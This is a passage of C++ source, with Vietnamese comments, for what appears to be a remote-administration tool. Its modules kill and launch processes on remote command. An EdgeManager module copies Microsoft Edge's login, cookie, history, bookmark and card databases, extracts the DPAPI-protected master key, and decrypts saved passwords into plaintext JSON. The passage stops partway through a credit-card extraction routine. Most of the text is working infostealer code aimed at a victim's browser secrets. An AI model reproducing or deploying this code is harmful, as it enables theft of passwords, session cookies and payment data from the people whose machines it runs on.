//     // pkill thất bại (thường là do không tìm thấy tiến trình)
//     return {
//         {"status", "error"},
//         {"module", get_module_name()},
//         {"message", "Application not found or pkill failed"},
//         {"data", app_name}
//     };
// } 

json AppManager::kill_app_by_name(const std::string& keyword) {
    int killed = 0;
    std::vector<std::string> killed_details;
    
    std::string search_term = to_lower(keyword);
    if (search_term.empty()) {
         return {
            {"status", "error"},
            {"module", get_module_name()},
            {"command", "KILL"},
            {"error", "Keyword cannot be empty"}
        };
    }

    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        return {
            {"status", "error"}, 
            {"module", get_module_name()},
            {"command", "KILL"},
            {"error", "Cannot open /proc directory"}
        };
    }

    pid_t my_pid = getpid();

    struct dirent* entry;
    
    while ((entry = readdir(proc_dir)) != NULL) {
        
        if (entry->d_type != DT_DIR) continue;
        if (!std::isdigit(entry->d_name[0])) continue;

        std::string pid_str = entry->d_name;
        int pid = std::stoi(pid_str);

        if (pid == my_pid) continue;

        std::string comm_path = "/proc/" + pid_str + "/comm";
        std::ifstream cmd_file(comm_path);
        std::string exe_name;

        if (cmd_file.is_open()) {
            std::getline(cmd_file, exe_name);
            
            if (!exe_name.empty() && exe_name.back() == '\n') {
                exe_name.pop_back();
            }

            std::string exe_lower = to_lower(exe_name);
            
            if (exe_lower.find(search_term) != std::string::npos) {
                
                if (kill(pid, SIGKILL) == 0) {
                    killed++;
                    killed_details.push_back(exe_name + " (" + pid_str + ")");
                } else {
                }
            }
        }
        cmd_file.close();
    }

    closedir(proc_dir);

    return {
        {"status", "success"},
        {"module", get_module_name()},
        {"action", "KILL"},
        {"data", {
            {"keyword", keyword},
            {"killed_count", killed},
            {"details", killed_details}
        }}
    };
}

json AppManager::handle_command(const json& request) {
    const std::string command = request.value("command", "");
    json payload;
    if (request.contains("payload")) payload = request["payload"];

    if (command == "LIST") return list_apps();
    
    if (command == "KILL") {
        std::string name = payload.value("name", "");
        if (name.empty()) return {
            {"status", "error"}, 
            {"module", get_module_name()},
            {"error", "Missing name"}
        };
        return kill_app_by_name(name);
    }

    if (command == "START") {
        std::string path = payload.value("path", "");
        if (path.empty()) return {
            {"status", "error"}, 
            {"module", get_module_name()},
            {"error", "Missing path"}};
        return start_app(path);
    }

    return {
        {"status", "error"}, 
        {"module", get_module_name()},
        {"error", "Unknown APP command"}};
}



/* ===== FILE: ./src/modules/AppManager_win.cpp ===== */

#if _WIN32
#include "AppManager.hpp"
#include <unordered_map>
#include <shellapi.h> // <--- Thêm dòng này để dùng ShellExecute

// Helper: Chuyển chuỗi về chữ thường
static std::string to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c){ return std::tolower(c); });
    return s;
}

// Helper: WCHAR -> UTF-8
static std::string to_utf8(const std::wstring& wide_str) {
    if (wide_str.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide_str.c_str(),
                                          static_cast<int>(wide_str.size()),
                                          nullptr, 0, nullptr, nullptr);
    std::string out(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide_str.c_str(),
                        static_cast<int>(wide_str.size()),
                        out.data(), size_needed, nullptr, nullptr);
    return out;
}

// ========== 1. LIST_APPS ==========
json AppManager::list_apps() {
    json apps = json::array();
    std::unordered_map<std::string, json> map;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return {{"status","error"}, {"message","CreateToolhelp32Snapshot failed"}};
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            std::string exe = to_utf8(std::wstring(pe32.szExeFile));
            auto& app_entry = map[exe];
            
            if (app_entry.is_null()) {
                app_entry["exe"] = exe;
                app_entry["count"] = 0;
                app_entry["processes"] = json::array();
            }
            app_entry["count"] = app_entry["count"].get<int>() + 1;
            
            json p;
            p["pid"] = static_cast<unsigned long>(pe32.th32ProcessID);
            p["threads"] = static_cast<unsigned long>(pe32.cntThreads);
            app_entry["processes"].push_back(p);

        } while (Process32NextW(snapshot, &pe32));
    }
    CloseHandle(snapshot);

    for (auto& kv : map) {
        apps.push_back(kv.second);
    }

    return {
        {"status","success"},
        {"module", get_module_name()},
        {"command","LIST"},
        {"data", apps}
    };
}

// ========== 2. KILL_APP_BY_NAME ==========
json AppManager::kill_app_by_name(const std::string& keyword) {
    int killed = 0;
    std::vector<std::string> killed_details;
    std::string search_term = to_lower(keyword);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return {{"status", "error"}};

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            std::string exe_name = to_utf8(std::wstring(pe32.szExeFile));
            std::string exe_lower = to_lower(exe_name);

            if (exe_lower.find(search_term) != std::string::npos) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    if (TerminateProcess(hProcess, 1)) {
                        killed++;
                        killed_details.push_back(exe_name + " (" + std::to_string(pe32.th32ProcessID) + ")");
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(snapshot, &pe32));
    }
    CloseHandle(snapshot);

    return {
        {"status", "success"},
        {"command", "KILL"},
        {"data", {
            {"keyword", keyword},
            {"killed_count", killed},
            {"details", killed_details}
        }}
    };
}

// ========== 3. START_APP (Phần bị thiếu gây lỗi) ==========
// ========== 3. START_APP (Sửa lại dùng ShellExecute) ==========
json AppManager::start_app(const std::string& path_or_cmd) {
    // ShellExecute thông minh hơn CreateProcess.
    // Nó có thể mở "chrome", "notepad", "www.google.com", hoặc file ảnh.
    // Tham số: Handle cha (NULL), Operation ("open"), File/Lệnh, Tham số, Thư mục, Kiểu hiển thị
    HINSTANCE result = ShellExecuteA(NULL, "open", path_or_cmd.c_str(), NULL, NULL, SW_SHOWNORMAL);

    // ShellExecute trả về giá trị > 32 nếu thành công
    if ((intptr_t)result > 32) {
        return {
            {"status", "success"},
            {"command", "START"},
            {"message", "Command executed successfully via ShellExecute"},
            {"input", path_or_cmd}
        };
    } else {
        return {
            {"status", "error"},
            {"message", "Failed to start app via ShellExecute"},
            {"error_code", (int)(intptr_t)result}
        };
    }
}

// ========== 4. DISPATCHER ==========
json AppManager::handle_command(const json& request) {
    const std::string command = request.value("command", "");
    json payload;
    if (request.contains("payload")) payload = request["payload"];

    if (command == "LIST") return list_apps();
    
    if (command == "KILL") {
        std::string name = payload.value("name", "");
        if (name.empty()) return {{"status", "error"}, {"message", "Missing name"}};
        return kill_app_by_name(name);
    }

    if (command == "START") {
        std::string path = payload.value("path", "");
        if (path.empty()) return {{"status", "error"}, {"message", "Missing path"}};
        return start_app(path);
    }

    return {{"status", "error"}, {"message", "Unknown APP command"}};
}
#endif



/* ===== FILE: ./src/modules/EdgeManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <nlohmann/json.hpp>
#include <string>
#include <vector>
#include <memory>
#include <functional>

// Forward declaration
struct sqlite3;

using json = nlohmann::json;

class EdgeManager : public IRemoteModule {
private:
    std::string module_name_ = "EDGE";
    
    // Utility functions
    std::string getAppDataPath();
    std::string getEdgeDatabasePath();
    std::string getLocalStatePath();
    std::vector<unsigned char> getMasterKey();
    
    // Decryption functions
    std::vector<unsigned char> decryptAESGCM(const std::vector<unsigned char>& ciphertext,
                                           const std::vector<unsigned char>& key,
                                           const std::vector<unsigned char>& iv);
    
    // Database helper functions
    bool copyDatabaseFile(const std::string& sourcePath, const std::string& destPath);
    sqlite3* openDatabase(const std::string& path, bool copyFirst = true);
    void closeDatabase(sqlite3* db, const std::string& tempPath = "");
    
    // Data extraction functions
    json extractCookies();
    json extractHistory();
    json extractPasswords();
    json extractCreditCards();
    json extractBookmarks();
    
    // Helper functions
    std::string wideStringToString(const std::wstring& wstr);
    std::wstring stringToWideString(const std::string& str);
    std::vector<unsigned char> base64Decode(const std::string& encoded);
    std::string base64Encode(const unsigned char* data, size_t length);

public:
    EdgeManager() = default;
    ~EdgeManager() = default;
    
    // IRemoteModule implementation
    const std::string& get_module_name() const override {
        return module_name_;
    }
    
    json handle_command(const json& request) override;
    
    // Main extraction function
    json extractEdgeData();
};


/* ===== FILE: ./src/modules/EdgeManager_linux.cpp ===== */

#include "modules/EdgeManager.hpp"

json EdgeManager::handle_command(const json& request) {
    // Trả về lỗi hoặc thông báo chưa hỗ trợ trên Linux
    return {
        {"status", "error"},
        {"message", "EdgeManager logic is not implemented on Linux yet."}
    };
}


/* ===== FILE: ./src/modules/EdgeManager_win.cpp ===== */

#include "EdgeManager.hpp"

// Windows headers
#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <dpapi.h>
#include <shlwapi.h>

// Standard C++ headers
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <codecvt>
#include <locale>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cstdio>
#include <map>

// Database
#include <sqlite3.h>

// OpenSSL for AES-GCM
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>

// Link libraries
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== PATH UTILITIES ====================

std::string EdgeManager::getAppDataPath() {
    wchar_t* localAppData = nullptr;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
    
    std::wstring wpath(localAppData);
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string path = converter.to_bytes(wpath);
    
    CoTaskMemFree(localAppData);
    return path;
}

std::string EdgeManager::getEdgeDatabasePath() {
    std::string appData = getAppDataPath();
    return appData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
}

std::string EdgeManager::getLocalStatePath() {
    std::string appData = getAppDataPath();
    return appData + "\\Microsoft\\Edge\\User Data\\Local State";
}

// ==================== DATABASE HELPERS ====================

bool EdgeManager::copyDatabaseFile(const std::string& sourcePath, const std::string& destPath) {
    DWORD attrs = GetFileAttributesA(sourcePath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return false;
    }
    
    if (!CopyFileA(sourcePath.c_str(), destPath.c_str(), FALSE)) {
        return false;
    }
    
    SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_NORMAL);
    return true;
}

sqlite3* EdgeManager::openDatabase(const std::string& path, bool copyFirst) {
    sqlite3* db = nullptr;
    std::string dbPath = path;
    std::string tempPath = "";
    
    if (copyFirst) {
        char tempName[L_tmpnam];
        std::tmpnam(tempName);
        tempPath = std::string(tempName) + ".db";
        
        if (!copyDatabaseFile(path, tempPath)) {
            return nullptr;
        }
        
        dbPath = tempPath;
    }
    
    if (sqlite3_open_v2(dbPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        if (!tempPath.empty()) {
            DeleteFileA(tempPath.c_str());
        }
        return nullptr;
    }
    
    return db;
}

void EdgeManager::closeDatabase(sqlite3* db, const std::string& tempPath) {
    if (db) {
        sqlite3_close(db);
    }
    
    if (!tempPath.empty()) {
        DeleteFileA(tempPath.c_str());
    }
}

// ==================== BASE64 UTILITIES ====================

std::vector<unsigned char> EdgeManager::base64Decode(const std::string& encoded) {
    if (encoded.empty()) return {};
    
    std::string clean_encoded;
    for (char c : encoded) {
        if (!isspace(static_cast<unsigned char>(c))) {
            clean_encoded += c;
        }
    }
    
    DWORD dataLen = 0;
    
    if (!CryptStringToBinaryA(clean_encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                              NULL, &dataLen, NULL, NULL)) {
        return {};
    }
    
    std::vector<unsigned char> data(dataLen);
    
    if (!CryptStringToBinaryA(clean_encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                              data.data(), &dataLen, NULL, NULL)) {
        return {};
    }
    
    data.resize(dataLen);
    return data;
}

std::string EdgeManager::base64Encode(const unsigned char* data, size_t length) {
    if (!data || length == 0) return "";
    
    DWORD base64Len = 0;
    
    if (!CryptBinaryToStringA(data, (DWORD)length, 
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                              NULL, &base64Len)) {
        return "";
    }
    
    std::string base64(base64Len, 0);
    
    if (!CryptBinaryToStringA(data, (DWORD)length, 
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                              &base64[0], &base64Len)) {
        return "";
    }
    
    base64.resize(base64Len);
    return base64;
}

// ==================== MASTER KEY EXTRACTION - FIXED ====================

std::vector<unsigned char> EdgeManager::getMasterKey() {
    std::string localStatePath = getLocalStatePath();
    
    // Mở file với encoding đúng
    std::ifstream file(localStatePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "[ERROR] Cannot open Local State file" << std::endl;
        return {};
    }

    try {
        // Đọc toàn bộ file
        std::string content((std::istreambuf_iterator<char>(file)), 
                            std::istreambuf_iterator<char>());
        file.close();
        
        // Tìm encrypted_key trong JSON (Edge dùng format khác)
        size_t start = content.find("\"encrypted_key\":\"");
        if (start == std::string::npos) {
            // Thử format khác
            start = content.find("\"os_crypt\":{\"encrypted_key\":\"");
            if (start != std::string::npos) {
                start = content.find("\"encrypted_key\":\"", start);
            }
        }
        
        if (start == std::string::npos) {
            std::cerr << "[ERROR] Could not find encrypted_key in Local State" << std::endl;
            return {};
        }
        
        start += 17; // Độ dài của "\"encrypted_key\":\""
        size_t end = content.find("\"", start);
        if (end == std::string::npos) {
            std::cerr << "[ERROR] Malformed JSON in Local State" << std::endl;
            return {};
        }
        
        std::string encrypted_key_b64 = content.substr(start, end - start);
        
        // Base64 decode
        std::vector<unsigned char> encrypted_key = base64Decode(encrypted_key_b64);
        if (encrypted_key.empty()) {
            std::cerr << "[ERROR] Failed to decode base64 key" << std::endl;
            return {};
        }
        
        // Kiểm tra và loại bỏ prefix "v10" nếu có
        if (encrypted_key.size() > 3 && 
            encrypted_key[0] == 'v' && 
            encrypted_key[1] == '1' && 
            encrypted_key[2] == '0') {
            encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 3);
        }
        
        // DPAPI decrypt
        DATA_BLOB dataIn, dataOut;
        dataIn.pbData = encrypted_key.data();
        dataIn.cbData = (DWORD)encrypted_key.size();
        
        if (CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut)) {
            std::vector<unsigned char> masterKey(dataOut.pbData, dataOut.pbData + dataOut.cbData);
            LocalFree(dataOut.pbData);
            
            if (masterKey.size() == 32) { // AES-256 key
                std::cout << "[SUCCESS] Master key extracted (32 bytes)" << std::endl;
                return masterKey;
            } else {
                std::cerr << "[ERROR] Master key is wrong size: " << masterKey.size() << " bytes" << std::endl;
                return {};
            }
        } else {
            DWORD error = GetLastError();
            std::cerr << "[ERROR] DPAPI failed (Error " << error << "). Trying alternative method..." << std::endl;
            
            // Thử phương pháp thay thế: đọc trực tiếp từ file JSON
            try {
                // Parse JSON đầy đủ
                size_t osCryptStart = content.find("\"os_crypt\"");
                if (osCryptStart != std::string::npos) {
                    size_t braceStart = content.find("{", osCryptStart);
                    size_t braceEnd = content.find("}", braceStart);
                    
                    if (braceEnd != std::string::npos) {
                        std::string osCryptSection = content.substr(braceStart, braceEnd - braceStart + 1);
                        // Đơn giản: tìm encrypted_key trực tiếp
                        size_t keyPos = osCryptSection.find("\"encrypted_key\":\"");
                        if (keyPos != std::string::npos) {
                            keyPos += 17;
                            size_t keyEnd = osCryptSection.find("\"", keyPos);
                            if (keyEnd != std::string::npos) {
                                std::string keyB64 = osCryptSection.substr(keyPos, keyEnd - keyPos);
                                std::vector<unsigned char> keyData = base64Decode(keyB64);
                                
                                // Loại bỏ "v10"
                                if (keyData.size() > 3 && 
                                    keyData[0] == 'v' && 
                                    keyData[1] == '1' && 
                                    keyData[2] == '0') {
                                    keyData.erase(keyData.begin(), keyData.begin() + 3);
                                }
                                
                                // Thử DPAPI lại
                                dataIn.pbData = keyData.data();
                                dataIn.cbData = (DWORD)keyData.size();
                                
                                if (CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut)) {
                                    std::vector<unsigned char> masterKey(dataOut.pbData, dataOut.pbData + dataOut.cbData);
                                    LocalFree(dataOut.pbData);
                                    
                                    if (masterKey.size() == 32) {
                                        std::cout << "[SUCCESS] Master key extracted via alternative method" << std::endl;
                                        return masterKey;
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (...) {
                // Bỏ qua lỗi
            }
            
            return {};
        }

    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Reading Local State: " << e.what() << std::endl;
        return {};
    }
}

// ==================== AES-GCM DECRYPTION ====================

std::vector<unsigned char> EdgeManager::decryptAESGCM(const std::vector<unsigned char>& ciphertext,
                                                    const std::vector<unsigned char>& key,
                                                    const std::vector<unsigned char>& iv) {
    if (ciphertext.size() < 16 || key.size() != 32 || iv.size() != 12) {
        return {};
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    // Tách tag (16 bytes cuối)
    size_t ciphertext_len = ciphertext.size() - 16;
    std::vector<unsigned char> tag(ciphertext.end() - 16, ciphertext.end());
    std::vector<unsigned char> encrypted_data(ciphertext.begin(), ciphertext.end() - 16);
    
    std::vector<unsigned char> plaintext(ciphertext_len + 16);
    int len = 0, total_len = 0;
    
    // Khởi tạo
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Set IV length
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Set key và IV
    if (!EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Giải mã
    if (!EVP_DecryptUpdate(ctx, plaintext.data(), &len, encrypted_data.data(), (int)ciphertext_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    total_len += len;
    
    // Set authentication tag
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    // Finalize
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + total_len, &len) <= 0) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    total_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(total_len);
    
    return plaintext;
}

// ==================== SIMPLE COOKIES EXTRACTION ====================

json EdgeManager::extractCookies() {
    json cookies = json::array();
    
    // Thử cả hai vị trí
    std::string cookiePath1 = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Cookies";
    std::string cookiePath2 = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
    
    std::string cookiePath;
    if (GetFileAttributesA(cookiePath1.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cookiePath = cookiePath1;
    } else if (GetFileAttributesA(cookiePath2.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cookiePath = cookiePath2;
    } else {
        std::cout << "[INFO] Cookies file not found" << std::endl;
        return cookies;
    }
    
    // Copy file
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(cookiePath, tempPath)) {
        return cookies;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    // Kiểm tra tables
    sqlite3_stmt* tableStmt;
    const char* tableSql = "SELECT name FROM sqlite_master WHERE type='table'";
    
    std::vector<std::string> tables;
    if (sqlite3_prepare_v2(db, tableSql, -1, &tableStmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(tableStmt) == SQLITE_ROW) {
            const unsigned char* name = sqlite3_column_text(tableStmt, 0);
            if (name) {
                tables.push_back(reinterpret_cast<const char*>(name));
            }
        }
        sqlite3_finalize(tableStmt);
    }
    
    if (tables.empty()) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    // Tìm bảng cookies
    std::string cookieTable;
    for (const auto& table : tables) {
        if (table.find("cookie") != std::string::npos || 
            table == "cookies" ||
            table == "moz_cookies") {
            cookieTable = table;
            break;
        }
    }
    
    if (cookieTable.empty()) {
        // Thử bảng đầu tiên
        cookieTable = tables[0];
    }
    
    // Query đơn giản
    std::string sql = "SELECT * FROM " + cookieTable + " LIMIT 100";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return cookies;
    }
    
    int colCount = sqlite3_column_count(stmt);
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json cookie;
        
        for (int i = 0; i < colCount; i++) {
            std::string colName = sqlite3_column_name(stmt, i);
            
            switch (sqlite3_column_type(stmt, i)) {
                case SQLITE_TEXT: {
                    const unsigned char* text = sqlite3_column_text(stmt, i);
                    if (text) {
                        cookie[colName] = reinterpret_cast<const char*>(text);
                    }
                    break;
                }
                case SQLITE_INTEGER:
                    cookie[colName] = sqlite3_column_int64(stmt, i);
                    break;
                case SQLITE_BLOB: {
                    // Đối với cookies, thường không cần giải mã
                    int size = sqlite3_column_bytes(stmt, i);
                    const void* data = sqlite3_column_blob(stmt, i);
                    if (data && size > 0) {
                        // Chỉ lấy nếu là text
                        std::string str(static_cast<const char*>(data), size);
                        if (std::all_of(str.begin(), str.end(), [](char c) {
                            return std::isprint(static_cast<unsigned char>(c)) || c == '\0';
                        })) {
                            str.erase(std::remove(str.begin(), str.end(), '\0'), str.end());
                            cookie[colName] = str;
                        }
                    }
                    break;
                }
            }
        }
        
        cookies.push_back(cookie);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return cookies;
}

// ==================== PASSWORDS EXTRACTION WITH FALLBACK ====================

json EdgeManager::extractPasswords() {
    json passwords = json::array();
    
    std::string loginDataPath = getEdgeDatabasePath();
    if (GetFileAttributesA(loginDataPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return passwords;
    }
    
    // Copy file
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(loginDataPath, tempPath)) {
        return passwords;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return passwords;
    }
    
    // Query đơn giản - chỉ lấy các cột cơ bản
    std::string sql = "SELECT origin_url, username_value, password_value FROM logins LIMIT 50";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return passwords;
    }
    
    std::vector<unsigned char> masterKey = getMasterKey();
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json password;
        
        // URL
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        if (url) password["url"] = reinterpret_cast<const char*>(url);
        
        // Username
        const unsigned char* username = sqlite3_column_text(stmt, 1);
        if (username) password["username"] = reinterpret_cast<const char*>(username);
        
        // Password
        int blobSize = sqlite3_column_bytes(stmt, 2);
        const void* blobData = sqlite3_column_blob(stmt, 2);
        
        if (blobData && blobSize > 0) {
            std::vector<unsigned char> encryptedData(
                static_cast<const unsigned char*>(blobData),
                static_cast<const unsigned char*>(blobData) + blobSize
            );
            
            // Kiểm tra xem có phải v10 không
            if (encryptedData.size() > 3 && 
                encryptedData[0] == 'v' && 
                encryptedData[1] == '1' && 
                encryptedData[2] == '0') {
                
                // Có master key thì giải mã AES-GCM
                if (!masterKey.empty() && encryptedData.size() > 15) {
                    try {
                        std::vector<unsigned char> iv(encryptedData.begin() + 3, 
                                                     encryptedData.begin() + 15);
                        std::vector<unsigned char> ciphertext(encryptedData.begin() + 15, 
                                                             encryptedData.end());
                        
                        std::vector<unsigned char> decrypted = decryptAESGCM(ciphertext, masterKey, iv);
                        
                        if (!decrypted.empty()) {
                            std::string passStr(decrypted.begin(), decrypted.end());
                            passStr.erase(std::remove(passStr.begin(), passStr.end(), '\0'), passStr.end());
                            password["password"] = passStr;
                            password["encryption"] = "AES-GCM";
                        } else {
                            password["password"] = "[ENCRYPTED_AES]";
                            password["encryption"] = "AES-GCM_FAILED";
                        }
                    } catch (...) {
                        password["password"] = "[ENCRYPTED_AES_ERROR]";
                    }
                } else {
                    // Không có master key
                    password["password"] = "[ENCRYPTED_NO_KEY]";
                    password["encryption"] = "AES-GCM_NO_KEY";
                }
            } else {
                // Không phải v10, có thể là plain text hoặc DPAPI
                // Thử đọc như string trước
                std::string passStr(static_cast<const char*>(blobData), blobSize);
                
                // Kiểm tra xem có phải là text hợp lệ không
                bool isPrintable = std::all_of(passStr.begin(), passStr.end(), [](char c) {
                    return std::isprint(static_cast<unsigned char>(c)) || c == '\0';
                });
                
                if (isPrintable && passStr.size() > 0) {
                    passStr.erase(std::remove(passStr.begin(), passStr.end(), '\0'), passStr.end());
                    password["password"] = passStr;
                    password["encryption"] = "PLAIN_TEXT";
                } else {
                    // Có thể là DPAPI hoặc binary data
                    password["password"] = "[BINARY_DATA]";
                    password["encryption"] = "UNKNOWN";
                }
            }
        } else {
            password["password"] = "";
        }
        
        passwords.push_back(password);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return passwords;
}

// ==================== SIMPLE HISTORY EXTRACTION ====================

json EdgeManager::extractHistory() {
    json history = json::array();
    
    std::string historyPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\History";
    if (GetFileAttributesA(historyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return history;
    }
    
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(historyPath, tempPath)) {
        return history;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tempPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tempPath.c_str());
        return history;
    }
    
    // Query đơn giản
    std::string sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return history;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json entry;
        
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* title = sqlite3_column_text(stmt, 1);
        
        if (url) entry["url"] = reinterpret_cast<const char*>(url);
        if (title) entry["title"] = reinterpret_cast<const char*>(title);
        
        entry["visits"] = sqlite3_column_int(stmt, 2);
        entry["last_visit"] = sqlite3_column_int64(stmt, 3);
        
        history.push_back(entry);
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempPath.c_str());
    
    return history;
}

// ==================== SIMPLE BOOKMARKS EXTRACTION ====================

json EdgeManager::extractBookmarks() {
    json bookmarks = json::array();
    
    std::string bookmarksPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks";
    std::ifstream file(bookmarksPath);
    
    if (!file.is_open()) {
        return bookmarks;
    }
    
    try {
        json bookmarksJson;
        file >> bookmarksJson;
        
        if (bookmarksJson.contains("roots")) {
            auto& roots = bookmarksJson["roots"];
            
            // Hàm đệ quy để trích xuất bookmarks
            std::function<void(const json&, const std::string&)> extract;
            extract = [&](const json& node, const std::string& folder) {
                if (node.is_object()) {
                    if (node.contains("type")) {
                        std::string type = node["type"];
                        if (type == "url") {
                            json bookmark;
                            bookmark["name"] = node.value("name", "");
                            bookmark["url"] = node.value("url", "");
                            bookmark["folder"] = folder;
                            bookmarks.push_back(bookmark);
                        } else if (type == "folder" && node.contains("children")) {
                            std::string newFolder = folder.empty() ? 
                                node.value("name", "") : 
                                folder + "/" + node.value("name", "");
                            
                            for (const auto& child : node["children"]) {
                                extract(child, newFolder);
                            }
                        }
                    }
                }
            };
            
            // Trích xuất từ các thư mục gốc
            if (roots.contains("bookmark_bar")) {
                extract(roots["bookmark_bar"], "Bookmarks Bar");
            }
            if (roots.contains("other")) {
                extract(roots["other"], "Other Bookmarks");
            }
            if (roots.contains("synced")) {
                extract(roots["synced"], "Synced");
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Parsing bookmarks: " << e.what() << std::endl;
    }
    
    return bookmarks;
}

// ==================== CREDIT CARDS EXTRACTION ====================

json EdgeManager::extractCreditCards() {
    json cards = json::array();
    
    std::string webDataPath = getAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Web Data";
    if (GetFileAttributesA(webDataPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return cards;
    }
    
    char tempName[L_tmpnam];
    std::tmpnam(tempName);
    std::string tempPath = std::string(tempName) + ".db";
    
    if (!copyDatabaseFile(webDataPath, tempPath)) {
        return cards;
    }
    
